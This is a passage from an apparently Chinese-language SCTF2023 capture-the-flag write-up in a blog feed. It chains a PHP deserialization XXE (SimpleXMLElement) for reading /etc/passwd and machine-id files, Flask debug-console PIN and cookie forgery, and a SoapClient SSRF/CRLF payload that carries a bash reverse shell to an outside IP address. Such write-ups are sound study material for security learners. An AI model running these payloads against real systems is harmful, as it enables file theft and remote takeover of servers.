&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&#39;;$arr&#x3D;array(&#39;properties&#39;&#x3D;&gt;array(&#39;$xml&#39;),&#39;type&#39;&#x3D;$class);echo serialize($arr);#a:2:&#123;s:10:&quot;properties&quot;;a:2:&#123;i:0;s:98:&quot;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:&#x2F;&#x2F;&#x2F;app&#x2F;app.py&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&quot;;i:1;s:1:&quot;2&quot;;&#125;s:4:&quot;type&quot;;s:16:&quot;SimpleXMLElement&quot;;&#125;</code></pre><p>源码如下，debug&#x3D;True，可以尝试进入控制台查看</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from flask import Flask app &#x3D; Flask(__name__) @app.route(&#39;&#x2F;&#39;) def index(): return &#39;Hello World!&#39; if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(host&#x3D;&quot;0.0.0.0&quot;,debug&#x3D;True) </code></pre><p>访问console看看</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$arr&#x3D;array(&#39;properties&#39;&#x3D;&gt;&#39;console&#39;);echo serialize($arr);#a:1:&#123;s:10:&quot;properties&quot;;s:7:&quot;console&quot;;&#125;</code></pre><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218014.png" alt="image-20230713232847848"></p><p>这里还有一个之前的功能点没利用到，就是SCTF()，我之前的想法是构造一个然后在反序列化的时候执行，但是仔细一想就知道行不通。</p><p>这里的正确做法依然是利用PHP原生类反序列化，利用的是SoapClient类。</p><blockquote><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p></blockquote><p>SoapClient类内部有一个__call()魔术方法，利用访问sctf()这个不存在的方法可触发该魔术方法</p><blockquote><p>当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p><p>该类的构造函数如下：</p><pre class="line-numbers language-none"><code class="language-none">&gt;public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</code></pre><ul><li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li></ul></blockquote><ul><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li></ul><p>这里的做法是利用SoapClient类进行SSRF+CRLF利用组合拳。</p><p>在本地搭建flask调试，输入pin码可以看到如下参数</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;console?__debugger__&#x3D;yes&amp;cmd&#x3D;pinauth&amp;pin&#x3D;310-566-904&amp;s&#x3D;m2gd46SPCKq3xBvkONlJ</code></pre><ul><li>__debugger__：调试模式的是否开启</li><li>cmd：输入的命令</li><li>pin：即pin码</li><li>s：代表secret</li></ul><p>我们进入控制台后会返回一个cookie</p><pre class="line-numbers language-none"><code class="language-none">__wzd148551f810a0da4e55b5&#x3D;1689267106|d9bcbb95c7f2</code></pre><p>cookie格式如下</p><pre class="line-numbers language-none"><code class="language-none">Cookie: cookieName&#x3D;时间戳|hash签名</code></pre><p>进入控制台后输入命令可以看到有如下参数</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;console?&amp;__debugger__&#x3D;yes&amp;cmd&#x3D;whoami&amp;frm&#x3D;0&amp;s&#x3D;m2gd46SPCKq3xBvkONlJ</code></pre><p>这里的思路是伪造cookie然后命令执行反弹shell</p><p>其中secret我们可以通过访问&#x2F;console获得。</p><p>cookie伪造&amp;pin码爆破脚本：<a href="https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code">https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code</a></p><p>需要提供的参数有<code>username</code>、<code>modname</code>、<code>appname</code>、<code>basefile</code>、<code>uuid</code>、<code>machineid</code>。</p><p>获得方式如下</p><ul><li>username：查看&#x2F;etc&#x2F;passwd 一般是app</li><li>modename: 默认flask.app</li><li>uuid：&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 16进制转10进制</li><li>machineid：machine_id由三个合并(docker环境就只需后两个)：1.&#x2F;etc&#x2F;machine-id 2.&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id 3.&#x2F;proc&#x2F;self&#x2F;cgroup</li><li>basefile：&#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py （默认路径）</li></ul><blockquote><p>伪造以前首先需要知道python的版本，我们查询一下是否存在 python3.8路径的<code>LICENSE.txt</code></p><pre class="line-numbers language-none"><code class="language-none">&gt;&#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;LICENSE.txt</code></pre></blockquote><p>以上文件皆使用XXE来读取</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$class&#x3D;&#39;SimpleXMLElement&#39;;$xml&#x3D;&#39;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;文件路径&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&#39;;$arr&#x3D;array(&#39;properties&#39;&#x3D;&gt;array($xml,&#39;2&#39;),&#39;type&#39;&#x3D;&gt;$class);echo serialize($arr);</code></pre><pre class="line-numbers language-none"><code class="language-none">a:2:&#123;s:10:&quot;properties&quot;;a:2:&#123;i:0;s:98:&quot;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&quot;;i:1;s:1:&quot;2&quot;;&#125;s:4:&quot;type&quot;;s:16:&quot;SimpleXMLElement&quot;;&#125;02:42:ac:13:00:02 &#x3D;&gt;2661721902 a:2:&#123;s:10:&quot;properties&quot;;a:2:&#123;i:0;s:118:&quot;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&quot;;i:1;s:1:&quot;2&quot;;&#125;s:4:&quot;type&quot;;s:16:&quot;SimpleXMLElement&quot;;&#125;349b3354-f67f-4438-b395-4fbc01171fdda:2:&#123;s:10:&quot;properties&quot;;a:2:&#123;i:0;s:104:&quot;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cgroup&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&quot;;i:1;s:1:&quot;2&quot;;&#125;s:4:&quot;type&quot;;s:16:&quot;SimpleXMLElement&quot;;&#125;96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687 </code></pre><p>获得了这些数据之后可以开始伪造cookie</p><pre class="line-numbers language-none"><code class="language-none">python3 exp.py --username app --modname flask.app --appname Flask --basefile &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py --uuid 2485378023426 --machineid 349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</code></pre><p>结果如下</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218824.png" alt="image-20230714153646385"></p><pre class="line-numbers language-none"><code class="language-none">Cookie:  __wzdb2a60e2b19822632a67c&#x3D;1689320197|11b8517fb9fbPIN:  121-260-582</code></pre><p>通过soapclient去访问debug界面，同时也只有soapclient可以做到携带cookie访问</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;console?&amp;__debugger__&#x3D;yes&amp;cmd&#x3D;__import__(&quot;os&quot;).popen(&quot;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124.223.5.175&#x2F;9080 &lt;&amp;1\&quot;&quot;)&amp;frm&#x3D;0&amp;s&#x3D;ECDJpSJ4XJ5AZJtaxMHT&#39;;$headers &#x3D; array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: __wzdb2a60e2b19822632a67c&#x3D;1689320197|11b8517fb9fb&#39;);$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,                               &#39;user_agent&#39; &#x3D;&gt;&quot;sammy\r\n&quot;.join(&quot;\r\n&quot;,$headers),                               &#39;uri&#39;&#x3D;&gt; &quot;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;&quot;));$arr&#x3D;array(&quot;properties&quot;&#x3D;&gt;urlencode(serialize($b)));echo serialize($arr);#</code></pre><p>不知道什么原因现在反弹不了shell，试了好几天了，中间有一次好不容易反弹出来了但又不知道怎么搞的让我弄断了，太搞心态了😭😭😭。但是步骤就是这样。这题也就记录到这里了。看其他师傅的wp是说后面使用SUID提权读flag。</p><p>最后感谢Boogipop师傅的解惑</p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;

&lt;h1 id=&quot;SCTF2023&quot;&gt;&lt;a href=&quot;#SCTF2023&quot; class=&quot;headerlink&quot; title=&quot;SCTF2023&quot;&gt;&lt;/a&gt;SCTF2023&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="技术" scheme="https://mizore.site/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
</feed>
